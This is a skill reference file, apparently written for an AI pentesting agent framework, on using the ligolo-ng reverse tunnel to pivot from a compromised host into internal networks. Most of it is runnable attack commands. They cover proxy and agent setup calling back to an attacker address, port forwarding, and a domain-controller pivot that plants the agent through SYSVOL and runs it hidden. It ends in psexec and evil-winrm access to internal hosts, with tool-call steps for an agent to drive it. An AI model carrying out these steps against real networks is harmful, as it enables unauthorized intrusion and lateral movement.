---
name: ligolo-ng
description: "Auth/lab ref: Reverse tunneling tool that creates a TUN interface on the attacker machine to route traffic into internal networks via a compromised pivot host."
license: GPL-3.0
compatibility: "Linux (proxy), Linux/Windows/macOS (agent); Requires TUN interface support (root on Linux)."
metadata:
  author: AeonDave
  version: "1.1"
---

# ligolo-ng

Reverse tunneling via TUN interface — cleaner pivot than SOCKS/proxychains, works at network layer.

## Architecture

```
Attacker (proxy)  ←—TLS tunnel—  Victim pivot (agent)  ——→  Internal network
    [TUN iface]                   [compromised host]          192.168.1.0/24
```

No proxychains needed — all tools work natively against internal IP ranges.

## Quick Start

```bash
# Attacker: create TUN interface and start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim pivot host: connect agent to proxy
./agent -connect <attacker_ip>:11601 -ignore-cert

# Back on attacker proxy console:
session          # select the agent session
start            # start tunneling

# Add route to internal subnet via TUN interface
sudo ip route add 192.168.1.0/24 dev ligolo
```

## Proxy Commands (Console)

| Command | Description |
|---------|-------------|
| `session` | List / select active sessions |
| `start` | Start tunnel for selected session |
| `stop` | Stop tunnel |
| `ifconfig` | Show remote interfaces/subnets |
| `listener_add` | Add port forwarder (agent→proxy) |
| `listener_list` | List active listeners |
| `listener_stop` | Stop a listener |

## Port Forwarding (Listener)

To expose an internal service to the attacker:

```bash
# In proxy console (after selecting session):
listener_add --addr 0.0.0.0:4444 --to 192.168.1.5:445 --tcp
# Now target attacker:4444 → internal 192.168.1.5:445
```

## Version-specific notes (0.8.x)

**WebUI prompt**: ligolo-ng 0.8.x prompts `Enable Ligolo-ng WebUI? (y/N)` on first run, blocking startup. This is an interactive prompt using a terminal UI library — stdin pipe/redirect may not reach it.

**Workaround for headless/agent execution**:
- After first run creates `ligolo-ng.yaml`, subsequent runs skip the prompt.
- On first run: launch as an interactive process (`start_interactive_shell` in MCPwn) so the prompt can be answered.
- Alternative: pre-create `ligolo-ng.yaml` in CWD with `webui: false`.

**MCPwn interactive workflow**:
```bash
# Start as interactive shell (required for session management)
start_interactive_shell(session_id, "ligolo-proxy -selfcert -laddr 0.0.0.0:11601")

# After agent connects, send commands via send_to_shell:
session   # shows interactive selector
          # send Enter to select first session
start     # activates the tunnel
```

**Critical operational note**: do NOT reset the pivot host's machine account password (e.g. `RODC01$`) before using RBCD S4U tickets through the tunnel. The pivot's local LSASS retains the old key — Kerberos service tickets encrypted with the new key fail with `STATUS_MORE_PROCESSING_REQUIRED`.

## Common Workflows

```bash
# Full pivot setup
# Step 1: Start proxy (attacker)
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Step 2: Run agent on pivot (upload via web server or existing shell)
# Linux pivot:
./agent -connect 10.10.14.1:11601 -ignore-cert &
# Windows pivot:
agent.exe -connect 10.10.14.1:11601 -ignore-cert

# Step 3: Add route (attacker)
# In proxy console:
session          # ID: 1 - pivot-host
start
# In terminal:
sudo ip route add 10.200.1.0/24 dev ligolo

# Step 4: Use internal IPs directly
nmap -sS 10.200.1.0/24
nxc smb 10.200.1.0/24
evil-winrm -i 10.200.1.50 -u admin -p pass
```

## RODC Pivot Pattern

Common in AD labs: DC → RODC on an internal subnet.

```bash
# 1. Proxy on attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 2. Agent on DC (has route to RODC subnet)
# Upload via SYSVOL (writable by domain users):
smbclient.py 'DOMAIN/user:pass@DC_IP' -c 'use SYSVOL; cd domain.local\scripts; put ligolo-agent.exe'
# Execute via WinRM with Start-Process (survives session close):
Start-Process -FilePath "C:\Windows\Temp\la.exe" -ArgumentList "-connect ATTACKER:11601 -ignore-cert" -WindowStyle Hidden

# 3. Select session + start tunnel in proxy console
session   # Enter to select
start

# 4. Add route
sudo ip route add 192.168.100.0/24 dev ligolo

# 5. Now reach RODC directly
ping 192.168.100.2
psexec.py -k -no-pass -dc-ip DC_IP -target-ip 192.168.100.2 'DOMAIN/Administrator@RODC01.domain.local'
```

**Why ligolo over chisel for Kerberos**: chisel TCP port-forwards cause Kerberos SPN validation failures (`STATUS_MORE_PROCESSING_REQUIRED`) because the client connects to 127.0.0.1 but the service ticket targets the real hostname. Ligolo's L3 TUN routing preserves the real destination IP, so Kerberos works natively.

## Double Pivot

For nested networks (attacker → pivot1 → pivot2 → internal):
- Run a second agent on pivot2 connecting back through pivot1 (via listener)
- Add a second TUN interface and route

## Resources

| File | When to load |
|------|--------------|
| `references/pivot-setup.md` | Double pivot, TLS certificate setup, agent persistence, Windows service install |

